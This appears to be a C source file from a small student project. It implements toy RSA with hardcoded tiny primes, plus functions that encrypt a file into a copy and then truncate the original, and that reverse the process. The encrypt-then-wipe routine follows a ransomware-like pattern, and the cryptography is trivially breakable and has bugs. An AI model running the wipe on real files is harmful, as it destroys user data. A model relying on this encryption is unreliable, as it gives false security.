#include "Backend.h"

// 计算最大公约数
ll gcd(ll a, ll b) {
    return b == 0 ? a : gcd(b, a % b);
}

// 计算 a^b mod m
ll mod_exp(ll base, ll exp, ll mod) {
    ll result = 1;
    base = base % mod;
    while (exp > 0) {
        if (exp % 2 == 1) {
            result = (result * base) % mod;
        }
        exp = exp >> 1;
        base = (base * base) % mod;
    }
    return result;
}

// 计算模反元素
ll mod_inverse(ll a, ll m) {
    a = a % m;
    for (ll x = 1; x < m; x++) {
        if ((a * x) % m == 1) {
            return x;
        }
    }
    return -1; // 如果没有模反元素
}

// 生成 RSA 密钥对
void generate_keys(ll p, ll q, PublicKey* pubKey, PrivateKey* privKey) {
    ll n = p * q;
    ll phi = (p - 1) * (q - 1);

    // 选择 e
    ll e = 3;
    while (gcd(e, phi) != 1) {
        e += 2; // 选择一个奇数
    }

    // 计算 d
    ll d = mod_inverse(e, phi);

    pubKey->e = e;
    pubKey->n = n;
    privKey->d = d;
    privKey->n = n;
}

// 加密
ll encrypt(ll message, PublicKey pubKey) {
    return   mod_exp(message, pubKey.e, pubKey.n);
}

// 解密
ll decrypt(ll message, PrivateKey privKey) {
    return   mod_exp(message, privKey.d, privKey.n);
}

//将所有文件加密,直接调用就行
void CyrptFile(const char* oriTxt) {

    //编辑文件名
    char cryTxt[256];
    memset(cryTxt, 0, sizeof(cryTxt));
    char* tmp = strrchr(oriTxt, '/');
    strncpy(cryTxt, oriTxt, abs(oriTxt - tmp));
    strncat(cryTxt, _CRY, sizeof(_CRY));
    strcat(cryTxt, tmp + 1);

    FILE* oriFile = fopen(oriTxt, "r");
    FILE* cryFile = fopen(cryTxt, "w");

    if (oriFile == NULL) {
        //perror("oriFile not found");
        return;
    }
    if (cryFile == NULL) {
        //perror("cryFile not found");
        return;
    }

    char c;	//存读入字符
    long long cyr;

    while ((c = fgetc(oriFile)) != EOF) {
        if (feof(oriFile)) {
            break;
        }
        else {				//读到其他字符存加密后的字符
            long long tmp = c;
            cyr = encrypt(tmp, pubKey);
            fprintf(cryFile, "%lld", cyr); //写入文件
            fputc(' ', cryFile); //写入空格

        }
    }
    fclose(oriFile);
    fclose(cryFile);

    oriFile = fopen(oriTxt, "w");//反手炸掉指挥部
    fclose(oriFile);
}

//将所有文件解密,直接调用就行
void DecyrptFile(const char* oriTxt) {
    //编辑文件名
    char cryTxt[256];
    memset(cryTxt, 0, sizeof(cryTxt));
    char* tmp = strrchr(oriTxt, '/');
    strncpy(cryTxt, oriTxt, abs(oriTxt - tmp));
    strncat(cryTxt, _CRY, sizeof(_CRY));
    strcat(cryTxt, tmp + 1);

    FILE* oriFile = fopen(oriTxt, "w");
    FILE* cryFile = fopen(cryTxt, "r");

    if (oriFile == NULL) {
        //perror("oriFile not found");
        return;
    }
    if (cryFile == NULL) {
        //perror("cryFile not found");
        return;
    }

    char c;     //用于接收longlong后的符号（逗号，空格或换行符）
    long long cyr;

    while (TRUE) {
        fscanf(cryFile, "%lld", &cyr);	//读取一个long long整数和一个符号
        if (feof(cryFile)) {
            break;
        }
        else {
            long long tmp = decrypt(cyr, privKey);
            c = (char)tmp;
            fputc(c, oriFile);
        }
    }

    fclose(oriFile);
    fclose(cryFile);

    cryFile = fopen(cryTxt, "w");//反手炸掉指挥部
    fclose(cryFile);
}

//初始化私钥和公钥
void InitKey() {

    long long p = 61; // 质数 p
    long long q = 53; // 质数 q
    generate_keys(p, q, &pubKey, &privKey);
}